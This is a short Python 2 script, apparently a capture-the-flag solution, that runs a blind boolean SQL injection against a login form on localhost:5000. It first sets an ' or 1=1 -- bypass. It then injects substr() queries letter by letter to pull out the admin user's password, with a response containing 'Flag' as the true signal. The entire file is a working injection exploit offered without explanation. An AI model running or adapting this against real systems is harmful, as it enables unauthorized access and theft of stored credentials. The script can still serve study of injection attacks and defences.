
import urllib
import time
data = {
    "username": "admin",
    "password": ""
}

data["password"]=""" ' or 1=1 -- """
url = "http://localhost:5000"

chars = map(chr, range(97,123))
st = ""
for i in range(1,20):
    c = ""
    for char in chars:
        data["password"] = """" or substr((select password from users where username='admin'),"""
        data["password"] += str(i) +",1 ) ='""" + char + """' --"""
        #print data["password"]
        d = urllib.urlencode(data).encode("utf-8")
        f = urllib.urlopen(url, d)
        a = f.read()

        if a.find("Flag") != -1:
            st += char
        time.sleep(0.01)
    print st
print st
